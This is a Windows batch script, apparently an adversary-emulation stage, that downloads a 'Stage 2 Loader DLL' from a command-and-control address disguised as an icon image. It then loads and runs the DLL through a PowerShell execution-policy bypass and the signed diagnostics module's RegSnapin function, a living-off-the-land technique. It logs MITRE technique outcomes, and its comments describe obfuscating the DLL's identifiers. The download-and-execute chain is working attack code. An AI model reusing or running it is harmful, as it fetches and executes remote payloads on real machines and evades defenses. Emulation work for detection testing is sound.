@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET akjdh=%APPDATA%\10957\bdde0708
SET mnbvf=987e60bd.txt
SET qwzxc=https://10.0.0.49/stage/2/icon.png?10957-7
SET plkmj=ITZEL-S2BO
SET vbnmc=10957
SET ghzxp=7
SET zXmQp=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: heartbeat_start>> "!zXmQp!" 2>nul

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL from C2
curl -k -s -o "!akjdh!\!mnbvf!" "!qwzxc!"
SET hb_res=%ERRORLEVEL%

REM Debug: heartbeat_complete
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: heartbeat_complete=!hb_res!>> "!zXmQp!" 2>nul

REM Step 2: Change working directory to output directory
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: chdir_start>> "!zXmQp!" 2>nul
cd /d "!akjdh!" >nul 2>&1
SET cd_res=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: chdir_result=!cd_res!>> "!zXmQp!" 2>nul

REM Step 3: Invoke the downloaded Stage 2 Loader DLL via PowerShell LOLBIN
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: powershell_start>> "!zXmQp!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin %APPDATA%\10957\bdde0708\\987e60bd.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
SET ps_res=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: powershell_result=!ps_res!>> "!zXmQp!" 2>nul

REM Logging for TTP T1218 – System Binary Proxy Execution
if !ps_res! EQU 0 (
  echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1218^|System Binary Proxy Execution=OK:>> "!zXmQp!" 2>nul
) else (
  echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1218^|System Binary Proxy Execution=FAIL:!ps_res!>> "!zXmQp!" 2>nul
)

REM Logging for TTP T1027 – Obfuscated Files or Information
if !hb_res! EQU 0 (
  echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1027^|Obfuscated Files or Information=OK:>> "!zXmQp!" 2>nul
) else (
  echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1027^|Obfuscated Files or Information=FAIL:!hb_res!>> "!zXmQp!" 2>nul
)

REM Obfuscation transformations applied to the .NET DLL source code (not BAT):
REM - Class names: 5-8 random characters (e.g., zXmQp, AkJdH, vBnMc)
REM - Method names: 4-8 random characters (e.g., mnbvf, qwzxc, plkmj)
REM - Variable names: nonsensical (e.g., akjdh, qpzmx, vbnmc)
REM - Property/Field names: random (e.g., private string wqpla)
REM - Parameter names: 4-6 random chars (e.g., string akjdh)
REM - Namespace (if used): random e.g. Qwzxc.Mnbvf.Akjdh
REM - Avoid descriptive words, single letters, underscores.

ENDLOCAL
exit /b 0